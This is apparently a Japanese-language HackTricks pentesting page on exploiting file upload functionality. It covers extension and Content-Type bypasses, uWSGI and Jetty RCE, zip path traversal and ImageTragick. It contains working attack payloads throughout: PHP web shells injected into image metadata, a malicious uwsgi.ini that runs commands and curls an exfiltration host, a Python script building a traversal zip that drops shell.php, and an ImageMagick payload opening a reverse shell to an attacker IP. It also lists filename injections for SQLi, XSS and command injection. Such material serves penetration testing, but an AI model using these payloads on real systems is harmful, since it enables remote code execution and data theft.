# ファイルアップロード

{{#include ../../banners/hacktricks-training.md}}

## ファイルアップロードの一般的な方法

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### ファイル拡張子チェックのバイパス

1. 該当する場合は、前述の拡張子をチェックしてください。また大文字を使ってテストすることも有効です: _pHp, .pHP5, .PhAr ..._
2. 実行拡張子の前に有効な拡張子を追加してみる（前述の拡張子も使用）:
- _file.png.php_
- _file.png.Php5_
3. 末尾に特殊文字を付けてみる。Burp を使って ascii と Unicode の文字を総当たりすることもできます。 (_前述の拡張子を試すこともできます_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. サーバ側の拡張子パーサを騙して保護を回避する（拡張子の二重化や拡張子間にゴミデータ（null バイト）を挿入するなど）。_より良いペイロードのために前述の拡張子を使うこともできます。_
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. 前述のチェックにさらに拡張子のレイヤを追加する:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. 実行拡張子を有効な拡張子の前に置いて、サーバが誤設定されていることを祈る（Apache の誤設定を突く際に、拡張子に .php が含まれていれば実行されるが、必ずしも .php で終わらない場合でもコードが実行されることがある）:
- _ex: file.php.png_
7. Windows の **NTFS alternate data stream (ADS)** を利用する。禁じられた拡張子の後にコロン ":" を挿入し、許可された拡張子の前に置くと、サーバ上に**空のファイル（禁じられた拡張子）**が作成されます（例: "file.asax:.jpg"）。このファイルは後で短いファイル名などを使って編集できる場合があります。 "**::$data**" パターンを使って非空のファイルを作成することも可能です。したがって、このパターンの後にドットを付けることでさらに制限を回避できる場合があります（例: "file.asp::$data."）。
8. ファイル名の長さ制限を突いて拡張子を切り捨てさせる。正当な拡張子が切れてしまい、悪意ある PHP が残る。AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Content-Type, Magic Number, 圧縮 & リサイズのバイパス

- Content-Type チェックは Content-Type ヘッダの値を次のように設定して回避できます: _image/png_, _text/plain_, application/octet-stream
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- magic number チェックは、ファイルの先頭に本物の画像のバイト列を追加して回避できます（file コマンドを混乱させる）。あるいはシェルをメタデータ内に埋め込むことも可能です:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
またはペイロードを直接画像に挿入することもできます:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- 画像に対して圧縮が行われる場合（たとえば PHP-GD のようなライブラリを使っている場合）、上記の手法は有効でないことがあります。その場合は **PLTE chunk** を使った [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) といった方法で、圧縮に耐えるテキストを挿入できます。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- ウェブページが画像をリサイズしている場合（例えば PHP-GD の `imagecopyresized` や `imagecopyresampled` を使用）、先の手法は効かないことがありますが、**IDAT chunk** を使った [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) で圧縮に耐えるテキストを挿入できます。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- PHP-GD の `thumbnailImage` 関数などでリサイズされる場合でも生き残るペイロードを作る別の手法として、**tEXt chunk** を使った [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) が有効です。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### その他のチェックポイント

- アップロード済みファイルの名前を変更できる脆弱性を見つける（拡張子を変更するため）。
- Local File Inclusion の脆弱性を見つけてバックドアを実行する。
- **情報漏洩の可能性**:
1. 同じファイルを複数回（かつ同時に）アップロードする
2. 既に存在するファイルやフォルダと同じ名前のファイルをアップロードする
3. ファイル名を "."、".."、あるいは "..." のようにしてアップロードする。例えば、Apache on Windows でアプリケーションが "/www/uploads/" にアップロードを保存する場合、"." というファイル名は "/www/" に "uploads" というファイルを作成してしまうことがある。
4. NTFS で削除しにくい名前（例: "…:.jpg"）を付けてアップロードする（Windows）
5. ファイル名に `|<>*?”` のような無効文字を含むファイルを Windows にアップロードする（Windows）
6. CON, PRN, AUX, NUL, COM1...などの予約済み（禁止）名を使って Windows にファイルをアップロードする
- 実行ファイル（.exe）や、開いたときにコードが実行される可能性のある .html（あまり疑われない）をアップロードすることも検討する。

### 特殊な拡張子のトリック

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` ファイルは Java の `.jar` に似ていますが PHP 用で、php として実行したりスクリプト内で include したりすることができます。

`.inc` 拡張子はインクルード用の php ファイルとして使われることがあり、その結果、この拡張子が実行可能として扱われていることがあるため注意が必要です。

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** As mentioned in the image below, upload the XML file to `$JETTY_BASE/webapps/` and expect the shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) 脆弱性は、`.ini` 設定ファイルを変更できる場合に uWSGI サーバで悪用され得ます。uWSGI の設定ファイルは、"magic" 変数、プレースホルダ、演算子を取り扱う特定の構文を利用します。特に '@' 演算子（`@(filename)` の形で使用）はファイルの内容を含めるために設計されています。uWSGI がサポートする各種スキームの中で、"exec" スキームは特に強力で、プロセスの標準出力からデータを読み取ることを許します。この機能は、`.ini` 設定ファイルが処理される際に Remote Command Execution や Arbitrary File Write/Read のような悪用に使われ得ます。

以下は、さまざまなスキームを示した悪意ある `uwsgi.ini` ファイルの例です:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
ペイロードの実行は、設定ファイルのパース時に発生します。設定が有効化されパースされるためには、uWSGI プロセスを再起動する（クラッシュ後や Denial of Service attack による可能性がある）か、ファイルを auto-reload に設定しておく必要があります。auto-reload 機能が有効な場合、変更を検知すると指定された間隔でファイルをリロードします。

uWSGI の設定ファイルのパースが緩いことを理解することが重要です。具体的には、ここで扱っているペイロードはバイナリファイル（画像や PDF など）に挿入することができ、潜在的な悪用の範囲をさらに拡大します。

## **wget File Upload/SSRF Trick**

場合によっては、サーバが **`wget`** を使って **ファイルをダウンロード** し、**URL** を **指定** できることがあります。こうしたケースでは、ダウンロードされるファイルの拡張子がホワイトリストに含まれているかをコード側でチェックし、許可されたファイルのみがダウンロードされるようにしていることがあります。しかし、**このチェックはバイパス可能です。**\
**linux** における **ファイル名** の **最大** 長は **255** ですが、**wget** はファイル名を **236** 文字に切り詰めます。ファイル名を **"A"\*232+".php"+".gif"** としてダウンロードすると、このファイル名は（この例では **".gif"** が有効な拡張子であるため）チェックを**バイパス**しますが、`wget` はファイル名を **"A"\*232+".php"** に**リネーム**します。
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## ツール

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) は、Pentesters や Bug Hunters がファイルアップロード機構のテストを行うのを支援するために設計された強力なツールです。さまざまな bug bounty techniques を活用して脆弱性の特定と悪用を簡素化し、web アプリケーションの徹底的な評価を支援します。

### Corrupting upload indices with snprintf quirks (historical)

一部のレガシーなアップロードハンドラは `snprintf()` 等を使って単一ファイルのアップロードからマルチファイル配列を構築していますが、これらは `_FILES` 構造を偽造されるように騙されることがあります。`snprintf()` の挙動における不整合や切り捨てのため、巧妙に作られた単一アップロードがサーバー側で複数のインデックス付きファイルとして見えることがあり、厳密な形状を前提としたロジック（例: multi-file upload とみなして安全でない分岐を取る）を混乱させます。今日ではニッチですが、この “index corruption” パターンは時折 CTFs や古いコードベースで再現されます。

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **アンチウイルス**
- Check if there is any **サイズ制限** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 異なるフォルダに解凍

アーカイブの解凍時にディレクトリ内でファイルが予期せず作成されることは重大な問題です。当初、この構成は悪意のあるファイルのアップロードによる OS-level command execution を防ぐと思われるかもしれませんが、ZIP の hierarchical compression support と directory traversal 機能は悪用可能です。これにより攻撃者は制限を回避し、対象アプリケーションの decompression 機能を操作して secure upload directories から脱出できます。

そのようなファイルを作成するための自動化された exploit は [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) で入手できます。ユーティリティは次のように使用できます:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
さらに、**symlink trick with evilarc** はオプションです。もしターゲットが `/flag.txt` のようなファイルであれば、そのファイルへの symlink をシステム上に作成してください。これにより evilarc が動作中にエラーを起こすことを防げます。

以下は、悪意のある zip ファイルを作成するための Python コードの例です:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**圧縮を悪用した file spraying**

For further details **check the original post in**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: このPHPコードは `$_REQUEST` 変数で渡されたコマンドを実行するように書かれている。

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: 複数のファイルを作成し、それらを含むzipアーカイブを作成する。

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip内のファイル名をviやhexエディタで変更し、"xxA"を"../"にしてディレクトリを横断する。

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

このコンテンツを画像拡張子でアップロードすることで脆弱性を悪用できます **(ImageMagick , 7.0.1-1)**（exploit: [https://www.exploit-db.com/exploits/39767](https://www.exploit-db.com/exploits/39767)）
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Embedding PHP Shell on PNG

PNGファイルのIDATチャンクにPHPシェルを埋め込むことで、一部の画像処理を回避できることがあります。PHP-GDの`imagecopyresized`や`imagecopyresampled`といった関数はリサイズやリサンプリングに頻繁に使われるため、本手法ではこれらの処理を受けても埋め込んだPHPシェルが影響を受けない点が重要な利点となります。

この手法の詳細な解説（方法論や応用例を含む）は、次の記事で確認できます: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)。このリソースはプロセスとその影響を包括的に説明しています。

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglotファイルは複数のファイルフォーマットとして同時に有効であり、カメレオンのように振る舞います。興味深い例としては[GIFAR](https://en.wikipedia.org/wiki/Gifar)があり、GIFとRARの両方として機能するハイブリッドです。これらはGIF+RARに限らず、GIF+JSやPPT+JSのような組み合わせも可能です。

polyglotファイルの主な有用性は、ファイルタイプでフィルタリングするセキュリティ対策を回避できる点にあります。多くのアプリケーションでは危険なフォーマット（例: JS, PHP, Phar）を避けるためにJPEG、GIF、DOCなど特定のファイルタイプのみをアップロード許可する運用が一般的です。しかしpolyglotは複数フォーマットの構造要件を満たすことで、これらの制限を巧妙にすり抜ける可能性があります。

とはいえ、polyglotにも制約はあります。例えばPHAR（PHp ARchive）とJPEGの両方を兼ねるpolyglotがあっても、プラットフォームが拡張子で厳格に許可を管理している場合は、構造的な二面性だけではアップロードに成功しないことがあります。

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

許可されていない場合でも、PDFを偽装して有効なJSONファイルをアップロードすることでファイルタイプ検出を回避する方法（**[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)** の手法）:

- **`mmmagic` library**: 最初の1024バイト内に`%PDF`のマジックバイトがあれば有効と判断される（投稿から例を参照）
- **`pdflib` library**: JSONのフィールド内に偽のPDFフォーマットを埋め込んでライブラリにPDFと誤認させる（投稿から例を参照）
- **`file` binary**: ファイルから最大1048576バイトを読み取る。これより大きなJSONを作成して中身をJSONとして解析できなくし、その内部に実際のPDFの先頭部分を入れるとPDFと判断される

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
